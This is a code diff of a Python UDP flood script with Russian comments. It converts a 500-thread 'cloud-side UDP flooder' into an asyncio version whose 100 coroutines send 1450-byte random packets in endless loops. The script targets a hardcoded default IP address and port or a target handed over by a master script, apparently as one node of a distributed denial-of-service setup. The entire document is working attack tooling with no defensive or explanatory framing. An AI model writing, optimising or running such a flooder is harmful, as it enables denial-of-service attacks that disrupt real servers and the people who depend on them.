@@ -1,46 +1,48 @@
-import socket
-import threading
-import random
-import os
+import asyncio
 import sys
+import os
 
-# --- CLOUD-SIDE UDP FLOODER (TARGET-AWARE) ---
+# Настройки
+PAYLOAD_SIZE = 1450
+THREADS_COUNT = 100 # В асинхронности больше не значит лучше
 
-def attack(ip, port):
-    # Создаем сокет для максимального флуда
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    # Генерируем жирный пакет данных (1450 байт)
-    payload = os.urandom(1450)
+async def udp_sender(ip, port, payload):
+    # Создаем транспорт один раз, чтобы не тратить ресурсы
+    loop = asyncio.get_running_loop()
+    transport, protocol = await loop.create_datagram_endpoint(
+        lambda: asyncio.DatagramProtocol(),
+        remote_addr=(ip, port)
+    )
     
-    while True:
-        try:
-            sock.sendto(payload, (ip, port))
-        except:
-            # Если канал перегружен, пересоздаем сокет и продолжаем
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            continue
+    try:
+        while True:
+            transport.sendto(payload)
+            # Минимальная пауза для переключения контекста (0 = макс скорость)
+            await asyncio.sleep(0) 
+    except Exception as e:
+        print(f"Error: {e}")
+    finally:
+        transport.close()
 
-if __name__ == "__main__":
-    # Проверяем, передал ли мастер-скрипт цель
+async def main():
     if len(sys.argv) < 3:
-        # Если аргументов нет, ставим дефолт (на всякий случай)
         target_ip = "77.110.105.224"
         target_port = 8303
     else:
         target_ip = sys.argv[1]
         target_port = int(sys.argv[2])
 
-    print(f"--- CLOUD NODE STARTED ---")
+    print(f"--- ASYNC NODE STARTED ---")
     print(f"Targeting: {target_ip}:{target_port}")
 
-    # Запускаем 500 агрессивных потоков
-    threads = []
-    for i in range(500):
-        t = threading.Thread(target=attack, args=(target_ip, target_port))
-        t.daemon = True
-        t.start()
+    payload = os.urandom(PAYLOAD_SIZE)
     
-    # Не даем виртуалке выключиться
-    while True:
-        import time
-        time.sleep(10)
+    # Запускаем группу корутин
+    tasks = [udp_sender(target_ip, target_port, payload) for _ in range(THREADS_COUNT)]
+    await asyncio.gather(*tasks)
+
+if __name__ == "__main__":
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("\nStopped by user.")
